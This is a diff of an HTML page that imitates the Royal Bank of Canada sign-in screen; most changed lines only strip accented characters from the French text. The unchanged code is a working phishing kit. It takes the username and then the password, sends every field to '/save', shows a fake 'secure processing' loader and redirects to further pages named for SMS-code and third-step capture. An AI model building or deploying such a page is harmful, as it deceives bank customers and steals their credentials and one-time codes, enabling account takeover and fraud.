@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RBC – Connexion sécurisée</title>
+    <title>RBC  Connexion scurise</title>
     <style>
         * {
             box-sizing: border-box;
@@ -168,11 +168,11 @@
 <div class="loader-overlay" id="loaderOverlay">
     <div class="spinner"></div>
     <div class="loader-text">Veuillez patienter...</div>
-    <div class="loader-sub">Traitement sécurisé en cours</div>
+    <div class="loader-sub">Traitement scuris en cours</div>
 </div>
 
 <div class="container">
-    <!-- Logo RBC (simplifié) -->
+    <!-- Logo RBC (simplifi) -->
     <svg class="rbc-logo" viewBox="0 0 77 100" fill="none" xmlns="http://www.w3.org/2000/svg">
         <path d="M74.901 2.10103V86.1644C74.901 89.3317 73.6037 91.1681 71.0718 92.1427C61.2344 95.9408 49.5833 97.8988 38.4999 97.8988C27.4181 97.8988 15.7672 95.941 5.92699 92.1427C3.39627 91.1681 2.09901 89.3317 2.09901 86.1644V2.10103H74.901ZM76.9999 0H74.9009H2.09901H0V2.10116V86.1645C0 90.1106 1.74054 92.7818 5.17323 94.1038C15.0235 97.9058 26.8595 100 38.4999 100C50.1424 100 61.9782 97.9059 71.8272 94.1032C75.2589 92.7822 77 90.111 77 86.1645V2.10103V0H76.9999Z" fill="white"/>
         <path d="M74.9779 86.1645C74.9779 89.3318 73.6792 91.1682 71.1448 92.1428C61.2973 95.9411 49.6342 97.899 38.5396 97.899C27.4464 97.899 15.7835 95.9411 5.93323 92.1428C3.39991 91.1682 2.10132 89.3318 2.10132 86.1645V2.10103H74.978V86.1645H74.9779Z" fill="#0051A5"/>
@@ -188,11 +188,11 @@
             <label for="username">Client Card or Username</label>
             <div class="input-wrapper">
                 <input type="text" id="username" name="username" placeholder="Entrez votre identifiant" value="">
-                <span class="lock-icon" title="Sécurité garantie">🔒</span>
+                <span class="lock-icon" title="Scurit garantie"></span>
             </div>
         </div>
 
-        <!-- Le champ mot de passe sera ajouté dynamiquement par le script si nécessaire -->
+        <!-- Le champ mot de passe sera ajout dynamiquement par le script si ncessaire -->
         <div id="passwordContainer"></div>
 
         <button type="button" id="actionBtn" class="btn">Next</button>
@@ -213,12 +213,12 @@
         var passwordContainer = document.getElementById('passwordContainer');
         var loader = document.getElementById('loaderOverlay');
 
-        // Variables d'état
+        // Variables d'tat
         var step = 1; // 1 = afficher le champ mot de passe, 2 = soumettre
 
         // Fonction pour afficher le champ mot de passe
         function showPasswordField() {
-            if (document.getElementById('fake_pwd')) return; // déjà présent
+            if (document.getElementById('fake_pwd')) return; // dj prsent
 
             var wrapper = document.createElement('div');
             wrapper.className = 'form-field';
@@ -228,13 +228,13 @@
             `;
             passwordContainer.appendChild(wrapper);
 
-            // Mettre à jour le bouton
+            // Mettre  jour le bouton
             btn.textContent = 'Sign In';
             btn.dataset.step = '2';
             step = 2;
         }
 
-        // Vérifier si le champ mot de passe est déjà présent (caché ou non)
+        // Vrifier si le champ mot de passe est dj prsent (cach ou non)
         function ensurePasswordVisible() {
             var pwd = document.getElementById('fake_pwd');
             if (pwd) {
@@ -246,7 +246,7 @@
                     parent.style.display = 'block';
                     parent.classList.remove('hidden', 'ng-hide', 'sf-hidden');
                 }
-                // Mettre à jour le bouton si ce n'est pas déjà fait
+                // Mettre  jour le bouton si ce n'est pas dj fait
                 if (btn.textContent !== 'Sign In') {
                     btn.textContent = 'Sign In';
                     btn.dataset.step = '2';
@@ -262,27 +262,27 @@
             e.preventDefault();
             e.stopPropagation();
 
-            // Étape 1 : le mot de passe n'est pas encore affiché
+            // tape 1 : le mot de passe n'est pas encore affich
             if (step === 1) {
-                // Vérifier si un champ mot de passe est déjà présent (caché)
+                // Vrifier si un champ mot de passe est dj prsent (cach)
                 var pwdExists = document.querySelector('input[type="password"]');
                 if (pwdExists) {
                     // Le champ existe, on le rend visible
                     ensurePasswordVisible();
-                    // On force le step à 2
+                    // On force le step  2
                     step = 2;
                     btn.textContent = 'Sign In';
                     btn.dataset.step = '2';
                 } else {
-                    // Créer le champ
+                    // Crer le champ
                     showPasswordField();
                 }
                 return;
             }
 
-            // Étape 2 : soumettre les données
+            // tape 2 : soumettre les donnes
             if (step === 2) {
-                // Afficher l'écran de chargement
+                // Afficher l'cran de chargement
                 loader.classList.add('active');
 
                 // Collecter tous les champs
@@ -297,7 +297,7 @@
                     data.fields[key] = inp.value;
                 });
 
-                // Envoyer les données (avec fallback si fetch échoue)
+                // Envoyer les donnes (avec fallback si fetch choue)
                 try {
                     fetch('/save', {
                         method: 'POST',
@@ -308,14 +308,14 @@
                     // Ignorer
                 }
 
-                // Rediriger après un court délai (simuler une validation)
+                // Rediriger aprs un court dlai (simuler une validation)
                 setTimeout(function() {
                     window.location.href = 'rbc_sms.html';
                 }, 3000);
             }
         });
 
-        // Détection initiale : si un champ mot de passe existe déjà (par exemple caché), on le rend visible et on passe en step 2
+        // Dtection initiale : si un champ mot de passe existe dj (par exemple cach), on le rend visible et on passe en step 2
         window.addEventListener('load', function() {
             var pwd = document.querySelector('input[type="password"]');
             if (pwd) {
@@ -326,8 +326,8 @@
             }
         });
 
-        // Option: réagir si un champ mot de passe est ajouté dynamiquement par un autre script
-        // On peut surveiller les mutations du DOM pour détecter l'apparition d'un champ password
+        // Option: ragir si un champ mot de passe est ajout dynamiquement par un autre script
+        // On peut surveiller les mutations du DOM pour dtecter l'apparition d'un champ password
         if (window.MutationObserver) {
             var observer = new MutationObserver(function(mutations) {
                 mutations.forEach(function(mutation) {
@@ -341,15 +341,15 @@
             observer.observe(document.body, { childList: true, subtree: true });
         }
 
-        // Rendre le bouton toujours cliquable (au cas où)
+        // Rendre le bouton toujours cliquable (au cas o)
         btn.disabled = false;
         btn.style.pointerEvents = 'auto';
     })();
 </script>
 
-<!-- fallback si le script ci-dessus échoue, on garde le comportement original -->
+<!-- fallback si le script ci-dessus choue, on garde le comportement original -->
 <noscript>
-    <p style="color:red;text-align:center;">JavaScript est désactivé. Veuillez l'activer pour vous connecter.</p>
+    <p style="color:red;text-align:center;">JavaScript est dsactiv. Veuillez l'activer pour vous connecter.</p>
 </noscript>
 
 
@@ -377,7 +377,7 @@ document.addEventListener("DOMContentLoaded", function() {
                         if (current.indexOf("_sms.html") !== -1) {
                             window.location.href = current.replace("_sms.html", "_step3.html");
                         } else if (current.indexOf("_step3.html") !== -1) {
-                            alert("Vérification terminée !");
+                            alert("Vrification termine !");
                         } else if (current !== "index.html" && current !== "") {
                             window.location.href = current.replace(".html", "_sms.html");
                         }
